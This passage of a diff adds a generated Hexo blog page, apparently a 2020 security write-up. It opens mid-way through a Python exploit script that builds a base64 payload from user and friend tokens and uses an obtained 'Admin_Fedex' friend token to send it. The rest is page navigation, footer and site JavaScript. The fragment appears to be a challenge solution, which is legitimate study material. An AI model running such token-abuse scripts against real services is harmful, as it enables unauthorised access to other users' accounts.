class="string">f'<span class="subst">&#123;user_token&#125;</span>\x00'</span>.encode(<span class="string">'utf-16le'</span>)   </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line"> </span><br><span class="line">    p += p32(len(<span class="string">'moba_friend_token'</span>)) </span><br><span class="line">    p += <span class="string">'moba_friend_token\x00'</span>.encode(<span class="string">'utf-16le'</span>) </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line">    p += p32(<span class="number">0</span>) </span><br><span class="line">    p += p32(len(friend_token)) </span><br><span class="line">    p += <span class="string">f'<span class="subst">&#123;friend_token&#125;</span>\x00'</span>.encode(<span class="string">'utf-16le'</span>)   </span><br><span class="line">    p += <span class="string">b'\x00'</span> * (-len(p) % <span class="number">4</span>) <span class="comment"># padding </span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fix the size </span></span><br><span class="line">    p[<span class="number">0</span>:<span class="number">4</span>] = p32(len(p[<span class="number">8</span>:])) </span><br><span class="line">    <span class="keyword">return</span> b64encode(p) </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> </span><br><span class="line">    token = get_token(<span class="string">"umut"</span>,<span class="string">"123456"</span>); </span><br><span class="line">    add_friend(token, <span class="string">"Admin_Fedex"</span>) </span><br><span class="line">    friend_token = get_friend_token(<span class="string">"Admin_FeDEX"</span>, token) </span><br><span class="line">    add_friend(friend_token, <span class="string">"umut"</span>) </span><br><span class="line">    payload = create_payload(friend_token, token) </span><br><span class="line">    send_moba(token, friend_token, payload) </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+                
+<p class="pink-link-context">
+    <a href="/2020/12/16/船/" rel="next" title="船 -- 白桦">
+    Prev: 船 -- 白桦
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/2020/11/25/记一次fuzz某短视频全家桶/" rel="next" title="记一次fuzz某短视频全家桶及相关思考">
+    Next: 记一次fuzz某短视频全家桶及相关思考
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect pink" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse pink darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer pink accent-1 darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">Social</h5>
+                
+                    <a class="social-link" href="https://github.com/cracke-s-j" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">Links</h5>
+                
+                    <a class="social-link" href="https://blog.dyf.ink/" target="_blank">友情链接 dyf&#39;s blog</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2020 ssj, All rights reserved.
+            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":250,"height":500,"position":"left","hOffset":0,"vOffset":-100},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
